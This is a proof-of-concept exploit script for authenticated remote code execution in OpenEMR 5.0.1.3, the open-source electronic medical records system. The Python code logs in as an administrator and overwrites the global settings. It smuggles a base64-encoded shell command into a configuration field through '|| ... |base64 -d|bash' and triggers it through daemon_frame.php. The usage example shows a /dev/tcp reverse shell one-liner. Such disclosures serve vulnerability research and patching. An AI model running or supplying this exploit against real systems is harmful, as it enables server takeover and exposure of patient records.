# Title: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
# Author: Cody Zacharias
# Date: 2018-08-07
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
# Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile
# Version: < 5.0.1 (Patch 4)
# Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3
# References:
# https://www.youtube.com/watch?v=DJSQ8Pk_7hc
'''
WARNING: This proof-of-concept exploit WILL replace the GLOBAL config.
If you don't want the OpenEMR config to be reset to default, please modify
the payload.

Example Usage:
- python openemr_rce.py http://127.0.0.1/openemr-5_0_1_3 -u admin -p admin -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'
'''

#!/usr/bin/env python

import argparse
import base64
import requests
import sys

ap = argparse.ArgumentParser(description="OpenEMR RCE")
ap.add_argument("host", help="Path to OpenEMR (Example: http://127.0.0.1/openemr).")
ap.add_argument("-u", "--user", help="Admin username")
ap.add_argument("-p", "--password", help="Admin password")
ap.add_argument("-c", "--cmd", help="Command to run.")
args = ap.parse_args()

ascii = "> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    <\r\n"
ascii+= ">/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   <\r\n"
ascii+= ">| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   <\r\n"
ascii+= ">| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    <\r\n"
ascii+= ">\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   <\r\n"
ascii+= "> )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  <\r\n"
ascii+= ">(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) <\r\n"
ascii+= "                                                       \r\n"
ascii+= "   ={>   P R O J E C T    I N S E C U R I T Y   <}=    \r\n"
ascii+= "                                                       \r\n"
ascii+= "         Twitter : >@Insecurity<                       \r\n"
ascii+= "         Site    : >insecurity.sh<                     \r\n"

green = "\033[1;32m"
red = "\033[1;31m"
clear = "\033[0m"

load = "[>$<] ".replace(">", green).replace("<", clear)
err = "[>-<] ".replace(">", red).replace("<", clear)
intro = ascii.replace(">", green).replace("<", clear)

print(intro)

with requests.session() as s:
    login = {"new_login_session_management": "1",
            "authProvider": "Default",
            "authUser": args.user,
            "clearPass": args.password,
            "languageChoice": "1"
            }

    print(load + "Authenticating with " + args.user + ":" + args.password)
    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login)
    if "login_screen.php?error=1&site=" in r.text:
        print(err + "Failed to Login.")
        sys.exit(0)

    # This will rewrite and replace your current GLOBALS, please modify this if you don't want that.
    payload = "form_save=Save&srch_desc=&form_0=main_info.php&form_1=..%2F..%2Finterface"
    payload += "%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&form_2=1&form_3=tabs_"
    payload += "style_full.css&form_4=style_light.css&form_5=__default__&form_6=__default"
    payload += "__&form_7=1&form_8=0&form_9=175&form_10=OpenEMR&form_12=1&form_13=0&form_"
    payload += "14=0&form_16=1&form_21=1&form_22=1&form_23=1&form_24=1&form_25=http%3A%2F"
    payload += "%2Fopen-emr.org%2F&form_26=&form_27=20&form_28=10&form_30=0&form_31=5&for"
    payload += "m_32=0&form_37=English+%28Standard%29&form_38=1&form_42=1&form_43=1&form_"
    payload += "44=1&form_45=1&form_46=1&form_47=1&form_48=1&form_49=1&form_50=1&form_51="
    payload += "0&form_52=0&form_53=&form_54=2&form_55=.&form_56=%2C&form_57=%24&form_58="
    payload += "0&form_59=3&form_60=6%2C0&form_61=0&form_62=0&form_63=_blank&form_69=1&fo"
    payload += "rm_70=1&form_77=1&form_79=&form_80=&form_81=&form_84=1&form_85=1&form_87="
    payload += "1&form_89=1&form_90=1&form_91=1&form_92=Y1&form_93=1&form_94=2&form_95=0&"
    payload += "form_97=14&form_98=11&form_99=24&form_100=20&form_102=1&form_103=0&form_1"
    payload += "04=0&form_105=ICD10&form_106=1&form_107=1&form_112=3&form_115=1&form_116="
    payload += "&form_119=1.00&form_121=0&form_123=&form_125=30&form_126=&form_127=60&for"
    payload += "m_128=&form_129=90&form_130=&form_131=120&form_132=&form_133=150&form_134"
    payload += "=&form_135=1&form_138=1&form_139=1&form_141=1&form_142=0&form_143=localho"
    payload += "st&form_144=&form_145=&form_146=5984&form_147=&form_150=Patient+ID+card&f"
    payload += "orm_151=Patient+Photograph&form_152=Lab+Report&form_153=Lab+Report&form_1"
    payload += "55=100&form_157=8&form_158=17&form_159=15&form_160=day&form_161=1&form_16"
    payload += "2=2&form_163=1&form_164=10&form_165=10&form_166=15&form_167=20&form_168=1"
    payload += "&form_169=%23FFFFFF&form_170=%23E6E6FF&form_171=%23E6FFE6&form_172=%23FFE"
    payload += "6FF&form_173=1&form_174=0&form_176=1&form_177=1&form_178=1&form_181=1&for"
    payload += "m_182=1&form_183=1&form_184=1&form_185=D0&form_186=D0&form_187=0%3A20&for"
    payload += "m_188=0&form_190=33&form_191=0&form_194=7200&form_198=1&form_199=0&form_2"
    payload += "00=0&form_202=&form_203=&form_204=365&form_205=&form_206=1&form_208=&form"
    payload += "_210=&form_211=&form_212=&form_213=&form_214=&form_215=&form_216=SMTP&for"
    payload += "m_217=localhost&form_218=25&form_219=&form_220=&form_221=&form_222=50&for"
    payload += "m_223=50&form_224=&form_225=&form_226=&form_227=50&form_228=&form_229=&fo"
    payload += "rm_230=&form_231=1&form_232=1&form_233=1&form_234=1&form_235=1&form_236=1"
    payload += "&form_237=1&form_238=1&form_239=Model+Registry&form_240=125789123&form_24"
    payload += "1=1&form_242=1&form_243=1&form_244=&form_245=&form_246=1&form_247=1&form_"
    payload += "248=1&form_249=5&form_250=1&form_252=1&form_253=1&form_254=1&form_255=1&f"
    payload += "orm_256=1&form_257=1&form_258=1&form_262=&form_263=6514&form_264=&form_26"
    payload += "5=&form_267=1&form_268=0&form_269=%2Fusr%2Fbin&form_270=%2Fusr%2Fbin&form"
    payload += "_271=%2Ftmp&form_272=%2Ftmp&form_273=26&form_274=state&form_275=1&form_27"
    payload += "6=26&form_277=country&form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6"
    payload += "+-o+page-left%3D72+-o+page-top%3D72&form_279=&form_280=&form_282=2018-07-"
    payload += "23&form_283=1&form_285=%2Fvar%2Fspool%2Fhylafax&form_286=enscript+-M+Lett"
    payload += "er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&form_288=%2Fmnt%2Fscan_docs&for"
    payload += "m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&form_292=1&form_"
    payload += "296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&form_297=1&form_"
    payload += "299=&form_300=&form_301=&form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr"
    payload += "ovider.php&form_303=https%3A%2F%2Fssh.mydocsportal.com&form_305=https%3A%"
    payload += "2F%2Fyour_cms_site.com%2F&form_306=&form_307=&form_308=0&form_309=https%3"
    payload += "A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&form_312=https%3A%2F%2Fsecure.newcrop"
    payload += "accounts.com%2FInterfaceV7%2FRxEntry.aspx&form_313=https%3A%2F%2Fsecure.n"
    payload += "ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F"
    payload += "%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&fo"
    payload += "rm_314=21600&form_315=21600&form_316=&form_317=&form_318=&form_319=1&form"
    payload += "_324=&form_325=0&form_327=137&form_328=7C84773D5063B20BC9E41636A091C6F17E"
    payload += "9C1E34&form_329=C36275&form_330=0&form_332=https%3A%2F%2Fphimail.example."
    payload += "com%3A32541&form_333=&form_334=&form_335=admin&form_336=5&form_339=1&form"
    payload += "_346=LETTER&form_347=30&form_348=30&form_349=72&form_350=30&form_351=P&fo"
    payload += "rm_352=en&form_353=LETTER&form_354=5&form_355=5&form_356=5&form_357=8&for"
    payload += "m_358=D&form_359=1&form_360=9&form_361=1&form_362=104.775&form_363=241.3&"
    payload += "form_364=14&form_365=65&form_366=220"

    p = {}
    for c in payload.replace("&", "\n").splitlines():
        a = c.split("=")
        p.update({a[0]: a[1]})

    # Linux only, but can be easily modified for Windows.
    _cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
    p.update({"form_284": _cmd})

    print(load + "Injecting payload")
    s.post(args.host + "/interface/super/edit_globals.php", data=p)
    sp = s.get(args.host + "/interface/main/daemon_frame.php") # M4tt D4em0n w0z h3r3 ;PpPpp
    if sp.status_code == 200:
        print(load + "Payload executed")